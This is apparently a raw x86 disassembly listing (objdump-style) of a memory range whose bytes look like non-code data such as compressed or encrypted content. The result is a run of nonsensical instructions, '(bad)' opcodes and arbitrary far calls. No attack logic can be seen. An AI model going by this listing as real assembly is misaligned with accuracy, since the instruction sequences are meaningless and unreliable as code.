  415f4e:	xor    BYTE PTR [ecx+0x53],ah
  415f51:	out    0x2d,eax
  415f53:	je     0x415fba
  415f55:	fild   DWORD PTR [edi+0x6e]
  415f58:	jmpw   0xc65a
  415f5c:	gs cmp al,0x69
  415f5f:	popa   
  415f60:	ins    BYTE PTR es:[edi],dx
  415f61:	int    0xec
  415f63:	sub    eax,0x5b1a64
  415f68:	dec    ecx
  415f69:	cmp    eax,0xf0776b12
  415f6e:	add    dl,BYTE PTR [eax+0x72]
  415f71:	cmp    DWORD PTR [esi+0x61],ebx
  415f74:	jae    0x415fc3
  415f76:	dec    DWORD PTR [esi+0x6f]
  415f79:	xor    BYTE PTR [ebx+0x73],al
  415f7c:	popa   
  415f7d:	cmp    al,0x34
  415f7f:	pop    esp
  415f80:	inc    esi
  415f81:	pop    edi
  415f82:	sub    al,0x5c
  415f84:	push   eax
	...
  415f99:	add    BYTE PTR [edx+0x43],bl
  415f9c:	arpl   WORD PTR [ecx-0x18],bp
  415f9f:	aaa    
  415fa0:	pop    esp
  415fa1:	inc    esi
  415fa2:	rcl    BYTE PTR [esi],cl
  415fa4:	pop    esp
  415fa5:	dec    eax
  415fa6:	stc    
  415fa7:	aaa    
  415fa8:	je     0x41601d
  415faa:	jle    0x415fc3
  415fac:	imul   esp,DWORD PTR [esi-0x3e],0x33
  415fb0:	pop    ebp
  415fb1:	jb     0x415f96
  415fb3:	or     al,BYTE PTR [esi+0x61]
  415fb6:	mov    eax,?
  415fb8:	pop    ebx
  415fb9:	push   eax
  415fba:	call   0x5309:0xa7696341
  415fc1:	pop    esp
  415fc2:	loope  0x415fdb
  415fc4:	xor    al,0x5c
  415fc6:	(bad)  
  415fc8:	push   edx
  415fc9:	je     0x415f9f
  415fcb:	(bad)  [ebp*2+0x5f50cfc9]
  415fd2:	mov    ch,0x6
  415fd4:	cmp    BYTE PTR [esi-0x3a],al
  415fd7:	lods   eax,DWORD PTR ds:[esi]
  415fd8:	xor    eax,0x5eb9c651
  415fdd:	fs imul eax,edx,0x62
  415fe1:	ins    BYTE PTR es:[edi],dx
  415fe2:	mov    al,cl
  415fe4:	dec    ecx
  415fe5:	addr16 xchg esp,eax
  415fe7:	vpmacssdd xmm13,xmm1,XMMWORD PTR [edi+0x3f],xmm5
  415fee:	push   edi
  415fef:	mov    ds:0xdb737168,eax
  415ff4:	xor    al,0x6d
  415ff6:	mov    DWORD PTR [edi+0x50],ebp
  415ff9:	pop    edi
  415ffa:	jne    0x415f82
  415ffc:	xor    eax,0x46
	...
  416011:	add    BYTE PTR [eax],al
  416013:	inc    esi
  416014:	ins    DWORD PTR es:[edi],dx
  416015:	adc    ebx,DWORD PTR [esp+esi*2+0x7a]
  416019:	dec    edi
  41601a:	arpl   WORD PTR [ebx-0x61],cx
  41601d:	push   0x5f
  41601f:	cmp    eax,DWORD PTR [eax+0x4c4e4860]
  416025:	dec    ebp
  416026:	ins    DWORD PTR es:[edi],dx
  416027:	xor    eax,0x5b463552
  41602c:	or     ecx,DWORD PTR [ebp+ebp*2+0x34]
  416030:	aaa    
  416031:	add    al,0x50
  416033:	push   es
  416034:	sub    eax,0x2e087551
  416039:	pusha  
  41603a:	add    bh,bl
  41603c:	cmp    BYTE PTR [ecx+0x74],dl
  41603f:	fnstcw WORD PTR [edx]
  416041:	arpl   WORD PTR [bx+0x50ee],sp
  416046:	arpl   bp,si
  416048:	fild   DWORD PTR [ebp+0x67]
  41604b:	add    DWORD PTR [ebx],eax
  41604d:	or     al,0x4
  41604f:	repnz gs pop ds
  416052:	aaa    
  416053:	leave  
  416054:	push   esi
  416055:	pop    ss
  416056:	shl    BYTE PTR es:[eax+0x0],0x4
  41605b:	repz dec ecx
  41605d:	das    
  41605e:	dec    ebp
  41605f:	idiv   BYTE PTR [esi]
  416061:	and    al,0x32
  416063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416064:	cmp    eax,DWORD PTR ds:0xfb63b353
  41606a:	addr16 jmp 0x4160c8
  41606d:	fld    DWORD PTR [ebx]
  41606f:	loope  0x4160c7
  416071:	xlat   BYTE PTR ds:[ebx]
  416072:	dec    esp
  416073:	xchg   ecx,eax
  416074:	pop    ebx
  416075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416076:	add    BYTE PTR fs:[eax],al
	...
  416089:	add    BYTE PTR [eax],al
  41608b:	add    BYTE PTR [edi+eiz*2+0x688232e7],cl
  416092:	mov    ebx,0xc454684e
  416097:	aaa    
  416098:	push   0x5a
  41609a:	rcl    BYTE PTR [edx-0x75],0x67
  41609e:	mov    ecx,0x955b5a37
  4160a3:	pop    edi
  4160a4:	jp     0x4160ff
  4160a6:	call   0x7868:0x84616623
  4160ad:	pusha  
  4160ae:	and    DWORD PTR [eax+0x55],0x2
  4160b2:	call   0x3564:0x76564166
  4160b9:	addr16 xchg ebx,eax
  4160bb:	ds dec edi
  4160bd:	pop    ebx
  4160be:	jp     0x416127
  4160c0:	inc    esp
  4160c1:	push   esp
  4160c2:	inc    ebx
  4160c3:	xor    BYTE PTR [edx],bh
  4160c5:	push   esi
  4160c6:	dec    eax
  4160c7:	push   0x694643c7
  4160cc:	or     al,0x62
  4160ce:	cmp    eax,0xe7550460
  4160d3:	aaa    
  4160d4:	loopne 0x416128
  4160d6:	cmp    cl,BYTE PTR [edi+0x8]
  4160d9:	push   edi
  4160da:	add    BYTE PTR [edx+0xb],cl
  4160dd:	add    edx,DWORD PTR [ecx+0x40]
  4160e0:	xlat   BYTE PTR ds:[ebx]
  4160e1:	arpl   WORD PTR [ecx+0x45],si
  4160e4:	mov    ds:0xf419472e,eax
  4160e9:	push   ebp
  4160ea:	addr16 sbb eax,0x365c5ac4
	...
  416104:	add    BYTE PTR [ebp+ebp*1+0x2931d46],dl
  41610b:	pop    esp
  41610c:	not    bl
  41610e:	pusha  
  41610f:	cs add cl,al
  416112:	add    BYTE PTR [bx+0x60c3],bh
  416117:	addr16 jmp 0xa79e9296
  41611d:	shl    BYTE PTR [edx],1
  41611f:	add    BYTE PTR [ebp-0x5affcb95],ch
  416125:	addr16 dec eax
  416127:	inc    esp
  416128:	mov    al,0xd6
  41612a:	add    al,BYTE PTR [ecx-0x6c]
  41612d:	rol    BYTE PTR [ebx+0x46],1
  416130:	popf   
  416131:	mov    ah,0x2
  416133:	dec    edi
  416134:	stos   BYTE PTR es:[edi],al
  416135:	pop    esp
  416136:	addr16 jno 0x4160d6
  416139:	adc    DWORD PTR [edi+esi*2-0x17],0x9d665d95
  416141:	imul   ebp,DWORD PTR [edi],0x45988472
  416147:	ins    BYTE PTR es:[edi],dx
  416148:	xchg   esi,eax
  416149:	inc    esi
  41614a:	das    
  41614b:	ins    BYTE PTR es:[edi],dx
  41614c:	call   0x4170:0xac500f65
  416153:	jae    0x4161ca
  416155:	inc    edi
  416156:	dec    eax
  416157:	push   esp
  416158:	cmp    DWORD PTR [ebx+0xa312018],eax
  41615e:	pop    esp
  41615f:	arpl   WORD PTR ds:0x3e5441d4,si
  416165:	or     bl,BYTE PTR [edi+0x62]
	...
  41617c:	add    BYTE PTR [eax],al
  41617e:	fbstp  TBYTE PTR [eax+eax*1]
  416181:	push   ebx
  416182:	icebp  
  416183:	xor    BYTE PTR [edi+esi*2-0x11],dh
  416187:	xor    al,0x61
  416189:	pop    esp
  41618a:	leave  
  41618b:	pop    edx
  41618c:	imul   esp,DWORD PTR [edx-0x61],0x5a
  416190:	dec    edi
  416191:	inc    ebx
  416192:	(bad)  
  416193:	push   ss
  416194:	inc    ecx
  416195:	pop    esp
  416196:	lea    edi,[edi]
  416198:	je     0x4161ff
  41619a:	mov    BYTE PTR [edx],dl
  41619c:	push   eax
  41619d:	and    BYTE PTR [eax],cl
  41619f:	and    edx,DWORD PTR [eax+0x72]
  4161a2:	mov    cl,0x30
  4161a4:	popa   
  4161a5:	jae    0x4161e4
  4161a7:	pop    esp
  4161a8:	imul   ebp,DWORD PTR [esi-0x61],0x5a
  4161ac:	pop    esp
  4161ad:	push   ecx
  4161ae:	std    
  4161af:	push   ds
  4161b0:	imul   ebp,DWORD PTR [edi-0xe],0x60
  4161b4:	pop    ebp
  4161b5:	jb     0x4161c5
  4161b7:	adc    ch,BYTE PTR [ebx+0x66]
  4161ba:	cli    
  4161bb:	cmp    eax,0x16db725d
  4161c0:	inc    ebx
  4161c1:	ins    BYTE PTR es:[edi],dx
  4161c2:	icebp  
  4161c3:	pusha  
  4161c4:	pop    ebp
  4161c5:	ins    BYTE PTR es:[edi],dx
  4161c6:	sbb    eax,0x4b503d42
  4161cb:	pop    ss
  4161cc:	aas    
  4161cd:	jne    0x4161d9
  4161cf:	xor    BYTE PTR [esi+0x54],al
  4161d2:	push   ds
  4161d3:	and    esi,DWORD PTR [ebx]
  4161d5:	and    BYTE PTR [esi],al
  4161d7:	imul   sp,WORD PTR [ebp+0x2],0x3f14
  4161dd:	push   esp
  4161de:	xor    DWORD PTR [esi+0x6c],esp
  4161e1:	bound  eax,QWORD PTR [eax]
	...
  4161f7:	das    
  4161f8:	xor    DWORD PTR [eax],eax
  4161fa:	push   ebx
  4161fb:	and    DWORD PTR ds:0x311f7774,ebp
  416201:	popa   
  416202:	pop    esp
  416203:	jns    0x41625f
  416205:	imul   esp,DWORD PTR [edx-0x11],0x5a
  416209:	dec    edi
  41620a:	inc    ebx
  41620b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41620c:	sbb    dh,BYTE PTR [ebx+eax*2]
  41620f:	repz sbb BYTE PTR [ebp+0x74],cl
  416213:	add    bl,BYTE PTR [esi]
  416215:	xor    BYTE PTR [eax-0x39],dl
  416218:	aam    0x21
  41621a:	push   eax
  41621b:	cmc    
  41621c:	inc    esp
  41621d:	pop    esi
  41621e:	arpl   sp,si
  416220:	or     BYTE PTR [ecx+0x6d],ch
  416223:	stc    
  416224:	cli    
  416225:	addr16 pop esp
  416227:	neg    BYTE PTR [eax]
  416229:	xor    BYTE PTR [ebp-0x38],ch
  41622c:	pop    es
  41622d:	bound  ebx,QWORD PTR [edi-0x2b]
  416230:	(bad)  [eax]
  416232:	ins    DWORD PTR es:[edi],dx
  416233:	ror    edi,0x4c
  416236:	pop    edi
  416237:	mov    ch,0x6
  416239:	cmp    BYTE PTR [ebp-0x35],al
  41623c:	add    al,0x62
  41623e:	pop    edi
  41623f:	ret    
  416240:	call   0x9f18a183
  416245:	xor    eax,0x5eb79a41
  41624a:	inc    esi
  41624b:	jae    0x4161d8
  41624d:	and    DWORD PTR [eax],edi
  41624f:	(bad)  
  416250:	mov    ds:0xa7826b64,eax
  416255:	xor    al,BYTE PTR [ecx+0x5b]
  416258:	mov    esp,0x6c64
	...
  41626d:	add    BYTE PTR [eax],al
  41626f:	add    BYTE PTR [ebp+0x54004fba],al
  416275:	mov    WORD PTR [ebx+0x74],ds
  416278:	jo     0x4162f4
  41627a:	dec    edi
  41627b:	arpl   WORD PTR [ebx+0x456d65a4],ax
  416281:	jp     0x4162e8
  416283:	push   ecx
  416284:	fs call 0x744e:0x986b4331
  41628c:	dec    edx
  41628d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41628e:	sub    eax,0x21938750
  416293:	push   eax
  416294:	xor    eax,0x34635b4c
  416299:	add    bl,BYTE PTR [edx+0x5d]
  41629c:	adc    bl,BYTE PTR [ebp+0x48]
  41629f:	pusha  
  4162a0:	sti    
  4162a1:	xor    ebp,DWORD PTR [edx]
  4162a3:	cmp    BYTE PTR [edx],al
  4162a5:	pop    esi
  4162a6:	cmp    esp,DWORD PTR [esi-0x18]
  4162a9:	push   eax
  4162aa:	out    0x2f,eax
  4162ac:	jmp    0x1a5e:0xd8664e5e
  4162b3:	inc    edi
  4162b4:	mov    al,0x32
  4162b6:	and    al,0x30
  4162b8:	out    0x57,al
  4162ba:	sbb    ebp,DWORD PTR [ecx-0x17]
  4162bd:	ss aaa 
  4162bf:	add    al,0xfb
  4162c1:	inc    ebp
  4162c2:	add    esp,DWORD PTR [ebx-0x3b]
  4162c5:	arpl   bx,di
  4162c7:	ss out 0x43,al
  4162ca:	pop    ss
  4162cb:	dec    ecx
  4162cc:	jecxz  0x41630f
  4162ce:	hlt    
  4162cf:	push   edi
  4162d0:	les    eax,FWORD PTR [ebx+ebx*1+0x34]
	...
  4162e8:	add    BYTE PTR [edi-0x589d06ce],al
  4162ee:	cs scas al,BYTE PTR es:[edi]
  4162f0:	pop    edi
  4162f1:	xchg   edx,eax
  4162f2:	pusha  
  4162f3:	enter  0x765f,0x41
  4162f7:	test   al,0x33
  4162f9:	fs cs stos BYTE PTR es:[edi],al
  4162fc:	pop    eax
  4162fd:	xchg   ebx,eax
  4162fe:	lods   eax,DWORD PTR ds:[si]
  416300:	aaa    
  416301:	push   edi
  416302:	and    ch,BYTE PTR [ebx-0x18988ca4]
  416308:	das    
  416309:	push   di
  41630b:	mov    bl,0x68
  41630d:	popa   
  41630e:	ss mov bh,0x3
  416311:	adc    DWORD PTR [ecx-0x74],0x21
  416315:	inc    ebx
  416316:	arpl   WORD PTR [ebx-0x7aa289fd],bx
  41631c:	push   edi
  41631d:	push   edx
  41631e:	arpl   WORD PTR [ecx+0x68],di
  416321:	arpl   WORD PTR [ebx+ecx*4+0x64],ax
  416325:	ss pop edx
  416327:	add    BYTE PTR [edi-0x45a3cd84],ch
  41632d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41632e:	xor    ebp,DWORD PTR [ebp+0x4f]
  416331:	call   DWORD PTR [ebp+0x5f]
  416334:	pop    ebx
  416335:	push   cs
  416336:	das    
  416337:	inc    esi
  416338:	inc    ebp
  416339:	or     dl,BYTE PTR [edx+0x68]
  41633c:	daa    
  41633d:	mov    ebx,0x41a0032
  416342:	gs je  0x41637b
  416345:	add    dl,BYTE PTR [ecx+0x63]
  416348:	adc    eax,0x3a5f5edd
	...
  416361:	add    bl,cl
  416363:	inc    esp
  416364:	pop    eax
  416365:	cmp    DWORD PTR [edi-0x3acfffea],edx
  41636b:	push   ecx
  41636c:	je     0x416376
  41636e:	(bad)  
  41636f:	pop    esi
  416370:	arpl   WORD PTR [ebx],bx
  416372:	fild   QWORD PTR [ebx]
  416374:	je     0x416387
  416376:	jnp    0x4163a3
  416378:	je     0x41638b
  41637a:	mov    ds:0xccfd5f52,eax
  41637f:	add    al,BYTE PTR [edi-0x1]
  416382:	rcl    DWORD PTR [esi+0x5f],1
  416385:	aad    0x80
  416387:	and    dl,BYTE PTR [eax-0x38]
  41638a:	jo     0x4163e6
  41638c:	add    BYTE PTR [ebp-0x58a0a975],ch
  416392:	test   DWORD PTR [esi+0x64],ebx
  416395:	int3   
  416396:	pop    edx
  416397:	add    bl,BYTE PTR [edx+ebx*4+0x5b]
  41639b:	push   esi
  41639c:	arpl   WORD PTR [edx-0x4aa0993a],di
  4163a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163a3:	cs dec edi
  4163a5:	pushf  
  4163a6:	and    DWORD PTR [ecx+0x69],0xffffffcf
  4163aa:	inc    eax
  4163ab:	sub    esi,DWORD PTR [ecx+ebp*8-0x80]
  4163af:	cmp    ah,BYTE PTR [edi-0x66]
  4163b2:	jo     0x416411
  4163b4:	jb     0x4163b6
  4163b6:	daa    
  4163b7:	and    ah,BYTE PTR [ecx+eiz*2+0x32]
  4163bb:	call   FWORD PTR [ebx+0x46]
  4163be:	sub    ah,BYTE PTR [edi+0x6f]
  4163c1:	push   0x5c501800
	...
  4163da:	add    BYTE PTR [ebp-0x15b9a3fa],bh
  4163e0:	pop    edi
  4163e1:	outs   dx,DWORD PTR ds:[esi]
  4163e2:	push   0x5c501ec0
  4163e7:	mov    dl,0x6
  4163e9:	pop    esp
  4163ea:	inc    esi
  4163eb:	xlat   BYTE PTR ds:[ebx]
  4163ec:	bound  esp,QWORD PTR [ecx+0x5a]
  4163ef:	xlat   BYTE PTR ds:[ebx]
  4163f0:	bound  ebp,QWORD PTR [ecx+eiz*2+0x7e]
  4163f4:	sbb    ebp,DWORD PTR [edi+0x69]
  4163f7:	mov    dl,0x63
  4163f9:	imul   esp,DWORD PTR [ecx-0x48],0xbc65635f
  416400:	and    BYTE PTR [eax+0x6d],bh
  416403:	stos   BYTE PTR es:[edi],al
  416404:	push   es
  416405:	pop    esp
  416406:	jb     0x4163ab
  416408:	gs popa 
  41640a:	outs   dx,BYTE PTR ds:[esi]
  41640b:	inc    edx
  41640c:	ss popa 
  41640e:	jb     0x416440
  416410:	fs jb  0x416486
  416413:	push   0x3e6c6937
  416418:	sbb    esp,DWORD PTR [esi+0x69]
  41641b:	cli    
  41641c:	arpl   WORD PTR [edx+0x69],di
  41641f:	jmp    0x6c2b:0xf62e5d2a
  416426:	add    BYTE PTR [ebp+0x62],cl
  416429:	data16 je 0x41646d
  41642c:	pusha  
  41642d:	jb     0x416494
  41642f:	sbb    bh,BYTE PTR [ecx]
  416431:	gs ins BYTE PTR es:[edi],dx
  416433:	jecxz  0x416451
  416435:	gs ins BYTE PTR es:[edi],dx
  416437:	sub    ah,BYTE PTR [eax+0x0]
  41643a:	push   ebx
  41643b:	cmp    DWORD PTR [ecx+0x74],ebx
  41643e:	ja     0x416440
	...
  416454:	das    
  416455:	xor    eax,0x9ba75c61
  41645a:	pop    edx
  41645b:	ins    BYTE PTR es:[edi],dx
  41645c:	inc    edx
  41645d:	(bad)  
  41645e:	pop    edx
  41645f:	ins    BYTE PTR es:[edi],dx
  416460:	push   ebx
  416461:	jp     0x416484
  416463:	inc    ecx
  416464:	dec    ebx
  416465:	jb     0x4164cd
  416467:	outs   dx,BYTE PTR ds:[esi]
  416468:	cmp    ebx,ecx
  41646a:	cmp    ch,BYTE PTR [esi+0x34]
  41646d:	push   ebp
  41646e:	bound  ebp,QWORD PTR [ebx+edx*1+0x41]
  416472:	dec    eax
  416473:	addr16 adc eax,0x146d39dc
  416479:	sub    BYTE PTR [ebx+edx*2],al
  41647c:	adc    al,0x3f
  41647e:	push   esi
  41647f:	add    bh,dl
  416481:	cmp    dl,BYTE PTR [ebx+0x71]
  416484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416485:	jmp    0x4164e5
  416487:	jb     0x416484
  416489:	(bad)  [ebx]
  41648b:	arpl   dx,di
  41648d:	or     BYTE PTR [eax+0x63],bl
  416490:	xchg   DWORD PTR [edi],edx
  416492:	pop    ecx
  416493:	jb     0x41643c
  416495:	or     al,0x65
  416497:	jb     0x416472
  416499:	not    BYTE PTR [ebp+0x20]
  41649c:	repz repnz push ebx
  41649f:	arpl   WORD PTR [edi-0x4e8d9b14],sp
  4164a5:	(bad)  
  4164a6:	push   ebp
  4164a7:	fild   WORD PTR cs:[eax]
  4164aa:	push   ebx
  4164ab:	je     0x416454
  4164ad:	in     al,dx
  4164ae:	fs jb  0x41644a
  4164b1:	mov    dh,0x53
  4164b3:	cs jb  0x416462
  4164b6:	data16 jb 0x4164b9
	...
  4164cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164ce:	mov    WORD PTR [esi+0x72],fs
  4164d1:	xchg   ecx,eax
  4164d2:	mov    esi,0xba572e53
  4164d7:	push   esp
  4164d8:	jno    0x416481
  4164da:	ins    BYTE PTR es:[edi],dx
  4164db:	data16 jb 0x416557
  4164de:	mov    dh,0x53
  4164e0:	cs push edi
  4164e2:	mov    BYTE PTR [ebx+0x74],dl
  4164e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164e6:	add    dh,BYTE PTR [edi-0x18a5ac9e]
  4164ec:	xor    al,0x44
  4164ee:	push   esp
  4164ef:	popf   
  4164f0:	push   bp
  4164f2:	cs nop
  4164f4:	push   ebx
  4164f5:	inc    esp
  4164f6:	add    dh,BYTE PTR [ebx-0x38b1c99e]
  4164fc:	xor    al,0x44
  4164fe:	push   esp
  4164ff:	jge    0x416567
  416501:	xor    eax,0x16609f22
  416506:	dec    edi
  416507:	out    0x3f,eax
  416509:	clc    
  41650a:	push   ebp
  41650b:	push   ebx
  41650c:	and    al,0xf6
  41650e:	pop    edi
  41650f:	pop    ecx
  416510:	push   esi
  416511:	add    al,0x55
  416513:	pop    es
  416514:	cmp    esi,esi
  416516:	pop    edi
  416517:	cmp    DWORD PTR [ebx+ebp*8],eax
  41651a:	arpl   WORD PTR [edx],di
  41651c:	pop    eax
  41651d:	(bad)  
  41651e:	xor    eax,0x5ff1524c
  416523:	cmp    DWORD PTR [edi+esi*8],esp
  416526:	arpl   WORD PTR [edx],bx
  416528:	push   ebx
  416529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41652a:	or     BYTE PTR ss:[ebx-0x25],dl
  41652e:	and    bh,BYTE PTR [edx]
  416530:	imul   eax,DWORD PTR [eax],0x0
	...
  416546:	aad    0x50
  416548:	add    al,0x52
  41654a:	xchg   DWORD PTR [edx],esi
  41654c:	push   ss
  41654d:	push   edx
  41654e:	mov    bl,0x2
  416550:	sub    esp,DWORD PTR [ebp-0x4a]
  416553:	dec    esi
  416554:	(bad)  
  416555:	xor    al,ah
  416557:	push   esp
  416558:	cmc    
  416559:	push   0x64b72295
  41655e:	xchg   ebx,eax
  41655f:	pop    edx
  416560:	out    0x3f,eax
  416562:	jo     0x4165b9
  416564:	(bad)  [ebx]
  416566:	jbe    0x4165c7
  416568:	fst    DWORD PTR [ebp-0x7c]
  41656b:	push   esp
  41656c:	pop    es
  41656d:	cmp    BYTE PTR [eax+0x52],dh
  416570:	les    eax,FWORD PTR [ebx]
  416572:	imul   ebp,DWORD PTR [esi],0x38c49900
  416578:	pop    edi
  416579:	mov    bh,0x83
  41657b:	pop    edi
  41657c:	pop    edi
  41657d:	popf   
  41657e:	jns    0x4165d4
  416580:	add    BYTE PTR [edi-0x55dfcd68],ah
  416586:	imul   ebx,DWORD PTR [ebp+0x6b],0x635e6288
  41658d:	jnp    0x416533
  41658f:	pusha  
  416590:	je     0x41660b
  416592:	push   eax
  416593:	popa   
  416594:	jno    0x416613
  416596:	mov    cl,BYTE PTR [esi+0x78]
  416599:	jne    0x41653f
  41659b:	es inc edx
  41659d:	pop    esp
  41659e:	pop    es
  41659f:	push   edi
  4165a0:	arpl   WORD PTR [ebp-0x25],dx
  4165a3:	push   esp
  4165a4:	ins    DWORD PTR es:[edi],dx
  4165a5:	inc    esi
  4165a6:	add    DWORD PTR [ebx],esp
  4165a8:	push   ecx
  4165a9:	add    BYTE PTR ds:[eax],al
	...
  4165bc:	add    BYTE PTR [eax],al
  4165be:	add    BYTE PTR [ecx],cl
  4165c0:	dec    edi
  4165c1:	jne    0x41660b
  4165c3:	aad    0x63
  4165c5:	add    BYTE PTR [edi],cl
  4165c7:	jmp    DWORD PTR [edi]
  4165c9:	je     0x4165b4
  4165cb:	mov    ah,BYTE PTR [eax+esi*2+0x3a]
  4165cf:	stos   DWORD PTR es:[edi],eax
  4165d0:	xor    DWORD PTR [ebp+0xf],ebp
  4165d3:	dec    DWORD PTR [ebp+0x5f]
  4165d6:	sbb    edi,DWORD PTR [esi-0x1ec6bdda]
  4165dc:	cs push eax
  4165de:	sub    eax,0x156c53e5
  4165e3:	into   
  4165e4:	dec    esi
  4165e5:	and    BYTE PTR [ecx],bl
  4165e7:	aad    0x55
  4165e9:	ins    DWORD PTR es:[edi],dx
  4165ea:	jae    0xd75aba30
  4165f0:	cmp    ebx,DWORD PTR [edi-0x30]
  4165f3:	jp     0x4165f7
  4165f5:	push   ecx
  4165f6:	into   
  4165f7:	mov    cl,BYTE PTR [esi+0x75]
  4165fa:	enter  0x6376,0x5c
  4165fe:	stos   DWORD PTR es:[edi],eax
  4165ff:	pop    edi
  416600:	push   esi
  416601:	ins    BYTE PTR es:[edi],dx
  416602:	add    bl,ch
  416604:	das    
  416605:	push   eax
  416606:	jb     0x4165e9
  416608:	sub    BYTE PTR [esi+0x20],ah
  41660b:	or     eax,0x19746629
  416610:	pop    edi
  416611:	jb     0x416678
  416613:	loop   0x416656
  416615:	jno    0x416683
  416617:	and    bl,BYTE PTR [ebx+0x74]
  41661a:	push   eax
  41661b:	sub    al,0x29
  41661d:	imul   esp,DWORD PTR [esi-0x12],0x3d
  416621:	push   esp
  416622:	push   eax
	...
  416637:	add    dh,ch
  416639:	inc    esp
  41663a:	ins    BYTE PTR es:[edi],dx
  41663b:	imul   ebp,DWORD PTR [ebx],0x35c7426
  416641:	pop    edi
  416642:	outs   dx,BYTE PTR gs:[esi]
  416644:	mov    ss,WORD PTR [ebx+ebp*2]
  416647:	data16 cli 
  416649:	sub    eax,0x12eb725d
  41664e:	inc    edx
  41664f:	push   eax
  416650:	mov    eax,0xcc5c500a
  416655:	das    
  416656:	ins    BYTE PTR es:[edi],dx
  416657:	ins    BYTE PTR es:[edi],dx
  416658:	jmp    0x416684
  41665a:	and    BYTE PTR [eax-0x54],dl
  41665d:	and    eax,0x409e666b
  416662:	push   esp
  416663:	push   eax
  416664:	mov    dl,0x5
  416666:	jo     0x4166dc
  416668:	mov    bh,0x25
  41666a:	outs   dx,BYTE PTR ds:[esi]
  41666b:	jae    0x4166ab
  41666d:	adc    ch,BYTE PTR [ebx+0x66]
  416670:	stos   BYTE PTR es:[edi],al
  416671:	sub    eax,0x12ab725d
  416676:	inc    edx
  416677:	jne    0x41660b
  416679:	bound  esp,QWORD PTR [ecx+0x74]
  41667c:	mov    ?,WORD PTR [ebx+ebp*2]
  41667f:	outs   dx,DWORD PTR ds:[esi]
  416680:	cwde   
  416681:	push   ds
  416682:	dec    edi
  416683:	outs   dx,DWORD PTR ds:[esi]
  416684:	test   al,0x2a
  416686:	jae    0x4166e9
  416688:	cld    
  416689:	pop    edi
  41668a:	pop    esp
  41668b:	inc    edx
  41668c:	sti    
  41668d:	es ins BYTE PTR es:[edi],dx
  41668f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416692:	xor    DWORD PTR [edx-0x70],esi
  416695:	mov    BYTE PTR [ebx+0x20],ah
  416698:	popa   
  416699:	xor    DWORD PTR gs:[eax],esp
	...
  4166b0:	add    BYTE PTR [ebp+esi*4+0x5a],ah
  4166b4:	arpl   WORD PTR [ecx-0x7b],di
  4166b7:	sub    eax,0x5a8d574d
  4166bc:	ins    DWORD PTR es:[edi],dx
  4166bd:	dec    ecx
  4166be:	ins    BYTE PTR es:[edi],dx
  4166bf:	add    DWORD PTR [ecx+0x40],edx
  4166c2:	jg     0x416719
  4166c4:	jne    0x41670c
  4166c6:	imul   esp,DWORD PTR [esi+0x5c],0x65
  4166ca:	mov    DWORD PTR [ebx+0x54],eax
  4166cd:	push   edi
  4166ce:	fnstcw WORD PTR ds:0x304d345f
  4166d4:	arpl   WORD PTR [esp+ecx*2],si
  4166d7:	pop    edx
  4166d8:	ins    DWORD PTR es:[edi],dx
  4166d9:	adc    DWORD PTR [esi-0x23fd93a6],ebx
  4166df:	xor    BYTE PTR [edi+0x1b],ah
  4166e2:	aas    
  4166e3:	dec    edi
  4166e4:	inc    esp
  4166e5:	(bad)  
  4166e6:	sub    DWORD PTR [edi+eax*2],eax
  4166e9:	adc    DWORD PTR [ecx],ebp
  4166eb:	pop    eax
  4166ec:	pop    edi
  4166ed:	or     esi,DWORD PTR [eax]
  4166ef:	dec    eax
  4166f0:	addr16 cmc 
  4166f2:	retf   0x2e01
  4166f5:	out    dx,eax
  4166f6:	ds pusha 
  4166f8:	add    BYTE PTR [ebx],al
  4166fa:	jmp    0xe816c65b
  4166ff:	inc    ebp
  416700:	push   esp
  416701:	neg    ebx
  416703:	inc    ebx
  416704:	pop    edi
  416705:	sar    esp,1
  416707:	push   ecx
  416708:	addr16 mov ebx,0xc32e4efe
  41670e:	cli    
  41670f:	push   edi
  416710:	add    bh,bl
  416712:	repnz dec esi
  416714:	je     0x416716
	...
  41672a:	mov    eax,0x8b2e4ac9
  41672f:	cli    
  416730:	push   edi
  416731:	add    BYTE PTR [esi-0x6a9834fe],al
  416737:	pusha  
  416738:	rcr    BYTE PTR ds:0x3db6383,cl
  41673e:	nop
  41673f:	dec    edi
  416740:	shl    BYTE PTR [eax-0x72],0x14
  416744:	retf   
  416745:	bound  edi,QWORD PTR [ebx+0x2]
  416748:	fwait
  416749:	aaa    
  41674a:	je     0x41679c
  41674c:	leave  
  41674d:	pop    esp
  41674e:	imul   ebp,DWORD PTR [esi],0x55760397
  416754:	lea    edx,[edi+0x5a]
  416757:	arpl   WORD PTR [ecx-0x63d1949a],bx
  41675d:	push   ecx
  41675e:	inc    ebp
  41675f:	push   ebp
  416760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416761:	aaa    
  416762:	push   edi
  416763:	add    dl,BYTE PTR [eax-0x77b1c9a3]
  416769:	pop    edi
  41676a:	cmp    edx,DWORD PTR [edx-0x78]
  41676d:	push   edi
  41676e:	lsl    ebx,WORD PTR [edx+0x5e4f015c]
  416775:	gs adc eax,0xfa373b60
  41677b:	dec    esi
  41677c:	dec    eax
  41677d:	sub    cl,ch
  41677f:	cmp    al,0x25
  416781:	xor    bh,dl
  416783:	add    ch,BYTE PTR [edx]
  416785:	push   esi
  416786:	add    al,0x5f
  416788:	inc    esp
  416789:	pop    edx
  41678a:	repz pop ebx
  41678c:	dec    eax
  41678d:	pop    eax
	...
  4167a2:	add    dh,dh
  4167a4:	arpl   WORD PTR [ebx],di
  4167a6:	push   eax
  4167a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167a8:	inc    ecx
  4167a9:	sbb    DWORD PTR [ecx-0x35],esp
  4167ac:	pop    edi
  4167ad:	or     eax,0x363c050
  4167b2:	inc    edi
  4167b3:	iret   
  4167b4:	pop    edi
